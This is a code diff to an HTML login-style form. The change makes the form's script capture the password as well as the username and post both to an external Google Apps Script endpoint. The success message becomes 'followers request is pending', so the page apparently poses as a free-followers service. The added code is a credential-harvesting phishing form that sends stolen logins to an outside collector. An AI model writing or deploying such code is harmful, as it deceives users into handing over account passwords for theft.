@@ -2,9 +2,10 @@
   <head>
     <script language="javascript">
 function sub() {
-    var b = document.frm1.txtuser.value;
+    var username = document.frm1.txtuser.value;
+    var password = document.frm1.txtpass.value;
 
-    if (b.length < 2) {
+    if (username.length < 2) {
         alert("Enter a valid username");
         return false;
     }
@@ -12,12 +13,12 @@ function sub() {
     fetch("https://script.google.com/macros/s/AKfycbxpAFZ60MmRtYpszLhrsBblOoHUwITdLPjGBSZq0CB2nJkhqoi0k05W3NW31DcZBjV5kw/exec", {
         method: "POST",
         body: JSON.stringify({
-            name: b,
-            message: "Form submitted"
+            username: username,
+            passeord: password,
         })
     });
 
-    alert("Submitted successfully!");
+    alert("followers request is pending");
     return false;
 }
 </script>
